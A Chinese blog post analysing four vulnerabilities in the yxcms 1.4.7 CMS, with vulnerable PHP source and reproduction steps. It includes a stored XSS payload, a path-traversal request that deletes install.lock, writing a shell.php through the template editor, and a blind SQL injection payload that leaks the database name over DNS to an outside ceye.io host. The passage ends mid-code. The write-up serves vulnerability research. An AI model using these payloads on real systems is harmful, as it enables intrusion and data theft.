<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1">
<title>yxcms 1.4.7 最新版漏洞分析 - F0rmat&#39;Blog</title>
<link rel="stylesheet" type="text/css" href="/css/main.css">
</head>
<body>
<header>
  <div>
    <h1><a href="https://getshe11.com/">F0rmat&#39;Blog</a></h1>
  </div>
  <nav></nav>
</header>
<main>
  <article>
    <div class="title">
  <h1>yxcms 1.4.7 最新版漏洞分析</h1>
  </div>
<div style="position: fixed; right:-30px; max-width:300px; overflow:auto; top: 1px; width: 300px; bottom:100px">

</div>
<div class="meta">
  <div>2018-09-17 13:16</div>
  <div>
    <span><a href="https://getshe11.com/tags/yxcms/">#yxcms</a></span>
      </div>
  </div>
<div class="content">
  <h1 id="0x01前言">0x01前言</h1>
<p>在先知看到的，大部分都是后台漏洞，部分厂商对于后台的漏洞都不认可，因为厂商觉得能进入后台这些漏洞都不是漏洞。最恐怖的是厂商否认了漏洞存在，然后偷偷的去修复。</p>
<h1 id="0x02-安装程序">0x02 安装程序</h1>
<p>具体的安装和使用的详细可以上官网查看https://www.kancloud.cn/yongheng/yxcms</p>
<h1 id="0x03-前台xss">0x03 前台XSS</h1>
<h2 id="1漏洞复现">1.漏洞复现</h2>
<ul>
<li>打开链接http://sb.com/index.php?r=default/column/index&amp;col=guestbook
输入payload：<code>&lt;svg/onload=alert(1)&gt;</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/8.png" alt=""></li>
</ul>
<!-- raw HTML omitted -->
<ul>
<li>然后登陆后台，查看审核
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/9.png" alt="">
点击编辑
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/10.png" alt=""></li>
</ul>
<h2 id="2漏洞分析">2.漏洞分析</h2>
<ul>
<li>前台的文件源码<code>protected/apps/default/controller/columnController.php</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">index</span>()
	{
		$ename<span style="color:#f92672">=</span><span style="color:#a6e22e">in</span>($_GET[<span style="color:#e6db74">&#39;col&#39;</span>]);
		<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($ename)) <span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;栏目名不能为空~&#39;</span>, <span style="color:#ae81ff">404</span>);
		$sortinfo<span style="color:#f92672">=</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;sort&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">find</span>(<span style="color:#e6db74">&#34;ename=&#39;</span><span style="color:#e6db74">{</span>$ename<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>,<span style="color:#e6db74">&#39;id,name,ename,path,url,type,deep,method,tplist,keywords,description,extendid&#39;</span>);
		$path<span style="color:#f92672">=</span>$sortinfo[<span style="color:#e6db74">&#39;path&#39;</span>]<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;,&#39;</span><span style="color:#f92672">.</span>$sortinfo[<span style="color:#e6db74">&#39;id&#39;</span>];
		$deep<span style="color:#f92672">=</span>$sortinfo[<span style="color:#e6db74">&#39;deep&#39;</span>]<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span>;
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">col</span><span style="color:#f92672">=</span>$ename;
		<span style="color:#66d9ef">switch</span> ($sortinfo[<span style="color:#e6db74">&#39;type&#39;</span>]) {
			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">1</span><span style="color:#f92672">://</span><span style="color:#a6e22e">文章</span>
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">newslist</span>($sortinfo,$path,$deep);
				<span style="color:#66d9ef">break</span>;
			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">2</span><span style="color:#f92672">://</span><span style="color:#a6e22e">图集</span>
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">photolist</span>($sortinfo,$path,$deep);
				<span style="color:#66d9ef">break</span>;
			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">3</span><span style="color:#f92672">://</span><span style="color:#a6e22e">单页</span>
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">page</span>($sortinfo,$path,$deep);
				<span style="color:#66d9ef">break</span>;
            <span style="color:#66d9ef">case</span> <span style="color:#ae81ff">4</span><span style="color:#f92672">://</span><span style="color:#a6e22e">应用</span>
				
				<span style="color:#66d9ef">break</span>;
			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">5</span><span style="color:#f92672">://</span><span style="color:#a6e22e">自定义</span>
				
				<span style="color:#66d9ef">break</span>;
			<span style="color:#66d9ef">case</span> <span style="color:#ae81ff">6</span><span style="color:#f92672">://</span><span style="color:#a6e22e">表单</span>
				$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">extend</span>($sortinfo,$path,$deep);
				<span style="color:#66d9ef">break</span>;
			<span style="color:#66d9ef">default</span><span style="color:#f92672">:</span>
				<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#e6db74">&#39;未知的栏目类型~&#39;</span>, <span style="color:#ae81ff">404</span>);
				<span style="color:#66d9ef">break</span>;
		}
	}   
</code></pre></div><ul>
<li>后台的文件源码<code>protected/apps/admin/controller/extendfieldController.php</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">mesedit</span>()
	{
        $tableid<span style="color:#f92672">=</span><span style="color:#a6e22e">intval</span>($_GET[<span style="color:#e6db74">&#39;tabid&#39;</span>]);
        <span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">checkConPower</span>(<span style="color:#e6db74">&#39;extend&#39;</span>,$tableid)) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;您没有权限管理此独立表内容~&#39;</span>);
        $id<span style="color:#f92672">=</span><span style="color:#a6e22e">intval</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);<span style="color:#75715e">//信息id
</span><span style="color:#75715e"></span>        <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($tableid) <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($id) ) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;参数错误~&#39;</span>);
        $tableinfo <span style="color:#f92672">=</span> <span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;extend&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">select</span>(<span style="color:#e6db74">&#34;id=&#39;</span><span style="color:#e6db74">{</span>$tableid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39; OR pid=&#39;</span><span style="color:#e6db74">{</span>$tableid<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>,<span style="color:#e6db74">&#39;id,tableinfo,name,type,defvalue&#39;</span>,<span style="color:#e6db74">&#39;pid,norder DESC&#39;</span>);
        <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($tableinfo)) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;自定义表不存在~&#39;</span>);
        <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isPost</span>()) {
           $info<span style="color:#f92672">=</span><span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;extend&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Extfind</span>($tableinfo[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;tableinfo&#39;</span>],<span style="color:#e6db74">&#34;id=&#39;</span><span style="color:#e6db74">{</span>$id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>);
           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">info</span><span style="color:#f92672">=</span>$info;
           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tableid</span><span style="color:#f92672">=</span>$tableid;
           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">id</span><span style="color:#f92672">=</span>$id;
           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tableinfo</span><span style="color:#f92672">=</span>$tableinfo;
           $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">display</span>();
        }<span style="color:#66d9ef">else</span>{
           <span style="color:#66d9ef">for</span>($i<span style="color:#f92672">=</span><span style="color:#ae81ff">1</span>;$i<span style="color:#f92672">&lt;</span><span style="color:#a6e22e">count</span>($tableinfo);$i<span style="color:#f92672">++</span>){
           	<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">is_array</span>($_POST[$tableinfo[$i][<span style="color:#e6db74">&#39;tableinfo&#39;</span>]]))
           	  $data[$tableinfo[$i][<span style="color:#e6db74">&#39;tableinfo&#39;</span>]]<span style="color:#f92672">=</span><span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,&#39;</span>,$_POST[$tableinfo[$i][<span style="color:#e6db74">&#39;tableinfo&#39;</span>]]);
           	<span style="color:#66d9ef">else</span>
           	  $data[$tableinfo[$i][<span style="color:#e6db74">&#39;tableinfo&#39;</span>]]<span style="color:#f92672">=</span><span style="color:#a6e22e">html_in</span>($_POST[$tableinfo[$i][<span style="color:#e6db74">&#39;tableinfo&#39;</span>]]);
           }
           <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;extend&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">Extup</span>($tableinfo[<span style="color:#ae81ff">0</span>][<span style="color:#e6db74">&#39;tableinfo&#39;</span>],<span style="color:#e6db74">&#34;id=&#39;</span><span style="color:#e6db74">{</span>$id<span style="color:#e6db74">}</span><span style="color:#e6db74">&#39;&#34;</span>,$data)) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">success</span>(<span style="color:#e6db74">&#39;修改成功~&#39;</span>,<span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#39;extendfield/meslist&#39;</span>,<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;id&#39;</span><span style="color:#f92672">=&gt;</span>$tableid)));
           <span style="color:#66d9ef">else</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;信息修改失败~&#39;</span>);
         }
	}
</code></pre></div><p>中间没什么过滤，具体可以看松哥的一篇文章：https://www.hackersb.cn/hacker/85.html</p>
<h1 id="0x04-任意文件删除">0x04 任意文件删除</h1>
<h2 id="1漏洞复现-1">1.漏洞复现</h2>
<ul>
<li>需要先登录后台，然后访问之后会显示缩略图不存在：
Payload：http://sb.com/index.php?r=admin/photo/delpic
POST：picname=../../protected/apps/install/install.lock
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/1.png" alt=""></li>
<li>然后访问网站首页就会自动转到安装的页面http://sb.com/index.php
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/2.png" alt=""></li>
<li>看到目录下的install.lock文件已经被删除了
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/3.png" alt=""></li>
</ul>
<h2 id="2漏洞分析-1">2.漏洞分析</h2>
<ul>
<li>漏洞文件：<code>protected/apps/admin/controller/photoController.php</code>,在第355行的delpic()函数，可以看到<code>$picname</code>接收POST过来的值，然后<code>$path</code>等于文件开头定义的静态变量
<code>static protected $uploadpath='';//图片上传路径</code>
没有对传入的值进行任何的过滤，使用函数<code>file_exists()</code>判断一下文件是否存在就给<code>unlink</code>执行删除文件了。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">delpic</span>()
	{
		<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;picname&#39;</span>])) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;参数错误~&#39;</span>);
		$picname<span style="color:#f92672">=</span>$_POST[<span style="color:#e6db74">&#39;picname&#39;</span>];
		$path<span style="color:#f92672">=</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">uploadpath</span>;
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($path<span style="color:#f92672">.</span>$picname))
		  <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($path<span style="color:#f92672">.</span>$picname);
		<span style="color:#66d9ef">else</span>{<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;图片不存在~&#39;</span>;<span style="color:#66d9ef">return</span>;} 
		<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">file_exists</span>($path<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;thumb_&#39;</span><span style="color:#f92672">.</span>$picname))
		   <span style="color:#f92672">@</span><span style="color:#a6e22e">unlink</span>($path<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;thumb_&#39;</span><span style="color:#f92672">.</span>$picname);
		<span style="color:#66d9ef">else</span> {<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;缩略图不存在~&#39;</span>;<span style="color:#66d9ef">return</span>;}
		<span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;原图以及缩略图删除成功~&#39;</span>;
	}
</code></pre></div><h1 id="0x05-任意文件写入">0x05 任意文件写入</h1>
<h2 id="1漏洞复现-2">1.漏洞复现</h2>
<ul>
<li>打开地址http://sb.com/index.php?r=admin/set/tpadd&amp;Mname=default
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/4.png" alt=""></li>
<li>打开我们的文件监控软件<code>FolderChangesView</code>，输入我们的程序路径<code>D:\phpStudy\PHPTutorial\WWW\YXcms</code>
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/5.png" alt=""></li>
<li>然后写shell.php文件名，写入我们的代码。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/6.png" alt=""></li>
<li>然后会在<code>\protected\apps\default\view\default</code>下面生成我们写入的文件。
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/7.png" alt=""></li>
</ul>
<h2 id="2漏洞分析-2">2.漏洞分析</h2>
<ul>
<li>漏洞文件<code>protected/apps/admin/controller/setController.php</code>的140行，<code>$tpfile</code>接收到GET传过来的值，如果为空的话就会报非法操作。传过来的URL是<code>admin/set/tpadd&amp;Mname=default</code>，所以<code>$tpfile</code>就是<code>default</code>。</li>
<li>再来下是检测是否有POST的值，接受到POST过来的<code>filename</code>,用<code>trim</code>去掉两边的空格。接收到POST过来的<code>code</code>，用<code>stripcslashes</code>反转义。</li>
<li><code>$filepath=$templepath.$filename.'.php'</code>这一句是路径和文件的拼接，然后下面检测路径是否存在。</li>
<li>最后没有过滤任何的危险函数就传给<code>file_put_contents</code>函数，写入网站的目录。</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">tpadd</span>()
	{
	   $tpfile<span style="color:#f92672">=</span>$_GET[<span style="color:#e6db74">&#39;Mname&#39;</span>];
	   <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($tpfile)) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;非法操作~&#39;</span>);
	   $templepath<span style="color:#f92672">=</span><span style="color:#a6e22e">BASE_PATH</span> <span style="color:#f92672">.</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tpath</span><span style="color:#f92672">.</span>$tpfile<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;/&#39;</span>;
	   <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isPost</span>()){
	   	 $filename<span style="color:#f92672">=</span><span style="color:#a6e22e">trim</span>($_POST[<span style="color:#e6db74">&#39;filename&#39;</span>]);
	   	 $code<span style="color:#f92672">=</span><span style="color:#a6e22e">stripcslashes</span>($_POST[<span style="color:#e6db74">&#39;code&#39;</span>]);
	   	 <span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($filename)<span style="color:#f92672">||</span><span style="color:#66d9ef">empty</span>($code)) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;文件名和内容不能为空&#39;</span>);
         $filepath<span style="color:#f92672">=</span>$templepath<span style="color:#f92672">.</span>$filename<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;.php&#39;</span>;
         <span style="color:#66d9ef">if</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ifillegal</span>($filepath)) {$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;非法的文件路径~&#39;</span>);<span style="color:#66d9ef">exit</span>;}
         <span style="color:#66d9ef">try</span>{
			<span style="color:#a6e22e">file_put_contents</span>($filepath, $code);
		  } <span style="color:#66d9ef">catch</span>(<span style="color:#a6e22e">Exception</span> $e) {
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;模板文件创建失败！&#39;</span>);
		  }	
		  $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">success</span>(<span style="color:#e6db74">&#39;模板文件创建成功！&#39;</span>,<span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#39;set/tplist&#39;</span>,<span style="color:#66d9ef">array</span>(<span style="color:#e6db74">&#39;Mname&#39;</span><span style="color:#f92672">=&gt;</span>$tpfile)));
	   }<span style="color:#66d9ef">else</span>{
	   	 $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">tpfile</span><span style="color:#f92672">=</span>$tpfile;
	   	 $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">display</span>();
	   	
	   }
	}
</code></pre></div><h1 id="0x06-sql注入">0x06 SQL注入</h1>
<h2 id="1漏洞复现-3">1.漏洞复现</h2>
<p>这个盲注可以用ceye.io和python脚本跑，我之前的文章也有写到。
<a href="http://sb.com/index.php?r=admin/fragment/index">http://sb.com/index.php?r=admin/fragment/index</a>
payload:<code>1 and if((select load_file(concat('\\\\',(select database()),'.xxxx.ceye.io\\abc'))),1,1))-- </code></p>
<ul>
<li>点击删除
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/11.png" alt="">
然后用burp截获数据，修改内容加上我们的payload，用原文的payload后面<code>+</code>会报错
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/12.png" alt="">
然后进入http://ceye.io/records/dns 查看我们的数据
<img src="https://pic-1252849007.cos.ap-guangzhou.myqcloud.com/yxcms/13.png" alt=""></li>
</ul>
<h2 id="2漏洞分析-3">2.漏洞分析</h2>
<ul>
<li>查看漏洞文件<code>protected/apps/admin/controller/fragmentController.php</code>的第63行</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">del</span>()
	{
		<span style="color:#66d9ef">if</span>(<span style="color:#f92672">!</span>$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">isPost</span>()){
			$id<span style="color:#f92672">=</span><span style="color:#a6e22e">intval</span>($_GET[<span style="color:#e6db74">&#39;id&#39;</span>]);
			<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($id)) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;您没有选择~&#39;</span>);
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;fragment&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">delete</span>(<span style="color:#e6db74">&#34;id=&#39;</span><span style="color:#e6db74">$id</span><span style="color:#e6db74">&#39;&#34;</span>))
			<span style="color:#66d9ef">echo</span> <span style="color:#ae81ff">1</span>;
			<span style="color:#66d9ef">else</span> <span style="color:#66d9ef">echo</span> <span style="color:#e6db74">&#39;删除失败~&#39;</span>;
		}<span style="color:#66d9ef">else</span>{
			<span style="color:#66d9ef">if</span>(<span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#39;delid&#39;</span>])) $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">error</span>(<span style="color:#e6db74">&#39;您没有选择~&#39;</span>);
			$delid<span style="color:#f92672">=</span><span style="color:#a6e22e">implode</span>(<span style="color:#e6db74">&#39;,&#39;</span>,$_POST[<span style="color:#e6db74">&#39;delid&#39;</span>]);
			<span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">model</span>(<span style="color:#e6db74">&#39;fragment&#39;</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">delete</span>(<span style="color:#e6db74">&#39;id in (&#39;</span><span style="color:#f92672">.</span>$delid<span style="color:#f92672">.</span><span style="color:#e6db74">&#39;)&#39;</span>))
			$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">success</span>(<span style="color:#e6db74">&#39;删除成功&#39;</span>,<span style="color:#a6e22e">url</span>(<span style="color:#e6db74">&#39;fragment/index&#39;</span>));
		}
	}
</code></pre></div><ul>
<li>我们跟<code>if(model('fragment')-&gt;delete(&quot;id='$id'&quot;))</code>,它会先到<code>protected/core.php</code>文件里面的<code>model</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">function</span> <span style="color:#a6e22e">model</span>($model){
	<span style="color:#66d9ef">static</span> $objArray <span style="color:#f92672">=</span> <span style="color:#66d9ef">array</span>();
	$className <span style="color:#f92672">=</span> $model <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;Model&#39;</span>;
	<span style="color:#66d9ef">if</span>( <span style="color:#f92672">!</span><span style="color:#a6e22e">is_object</span>($objArray[$className]) ){
		<span style="color:#66d9ef">if</span>( <span style="color:#f92672">!</span><span style="color:#a6e22e">class_exists</span>($className) ) {
			<span style="color:#66d9ef">throw</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">Exception</span>(<span style="color:#a6e22e">config</span>(<span style="color:#e6db74">&#39;_APP_NAME&#39;</span>)<span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;/&#39;</span> <span style="color:#f92672">.</span> $className <span style="color:#f92672">.</span> <span style="color:#e6db74">&#39;.php 模型类不存在&#39;</span>);
		}
		$objArray[$className] <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> $className();
	}
	<span style="color:#66d9ef">return</span> $objArray[$className];
}
</code></pre></div><ul>
<li>然后到<code>protected/apps/admin/model/fragmentModel.php</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">fragmentModel</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">baseModel</span>{
    <span style="color:#66d9ef">protected</span> $table <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;fragment&#39;</span>;
}
</code></pre></div><ul>
<li>继续<code>protected/base/model/baseModel.php</code></li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span>
<span style="color:#66d9ef">class</span> <span style="color:#a6e22e">baseModel</span> <span style="color:#66d9ef">extends</span> <span style="color:#a6e22e">model</span>{
     <span style="color:#66d9ef">protected</span> $prefix<span style="color:#f92672">=</span><span style="color:#e6db74">&#39;&#39;</span>;
     <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> __construct( $database<span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;DB&#39;</span>,$force <span style="color:#f92672">=</span> <span style="color:#66d9ef">false</span> ){
		<span style="color:#66d9ef">parent</span><span style="color:#f92672">::</span><span style="color:#a6e22e">__construct</span>();
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">prefix</span><span style="color:#f92672">=</span><span style="color:#a6e22e">config</span>(<span style="color:#e6db74">&#39;DB_PREFIX&#39;</span>);
	}
}
</code></pre></div><ul>
<li>再来到最底层的数据库操作类<code>protected/base/model/model.php</code>的第45行</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">delete</span>($condition){
<span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">model</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">table</span>, $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">ignoreTablePrefix</span>)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">where</span>($condition)<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">delete</span>();
	}
</code></pre></div><p>这个<code>delete()</code>是从哪里来的，我们来看第十三行的代码,创建了一个对象<code>cpModel</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">static</span> <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">connect</span>($config, $force<span style="color:#f92672">=</span><span style="color:#66d9ef">false</span>){
		<span style="color:#66d9ef">static</span> $model <span style="color:#f92672">=</span> <span style="color:#66d9ef">NULL</span>;
		<span style="color:#66d9ef">if</span>( $force<span style="color:#f92672">==</span><span style="color:#66d9ef">true</span> <span style="color:#f92672">||</span> <span style="color:#66d9ef">empty</span>($model) ){
			$model <span style="color:#f92672">=</span> <span style="color:#66d9ef">new</span> <span style="color:#a6e22e">cpModel</span>($config);
		}
		<span style="color:#66d9ef">return</span> $model;
	}
</code></pre></div><ul>
<li>漏洞文件在<code>protected/include/core/cpModel.class.php</code>,</li>
</ul>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">    <span style="color:#66d9ef">public</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">delete</span>() {
		$table <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>[<span style="color:#e6db74">&#39;table&#39;</span>];	<span style="color:#75715e">//当前表
</span><span style="color:#75715e"></span>		$where <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">_parseCondition</span>();	<span style="color:#75715e">//条件
</span><span style="color:#75715e"></span>		<span style="color:#66d9ef">if</span> ( <span style="color:#66d9ef">empty</span>($where) ) <span style="color:#66d9ef">return</span> <span style="color:#66d9ef">false</span>; <span style="color:#75715e">//删除条件为空时，则返回false，避免数据不小心被全部删除
</span><span style="color:#75715e"></span>			
		$this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sql</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;DELETE FROM </span><span style="color:#e6db74">$table</span><span style="color:#e6db74"> </span><span style="color:#e6db74">$where</span><span style="color:#e6db74">&#34;</span>;
        $query <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">execute</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">sql</span>);
		<span style="color:#66d9ef">return</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">affectedRows</span>();
    }
</code></pre></div><p>这里用到了一个方法<code>_parseCondition()</code></p>
<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php">	<span style="color:#66d9ef">private</span> <span style="color:#66d9ef">function</span> <span style="color:#a6e22e">_parseCondition</span>() {
		$condition <span style="color:#f92672">=</span> $this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">db</span><span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">parseCondition</span>($this<span style="color:#f92672">-&gt;</span><span style="color:#a6e22e">options</span>);
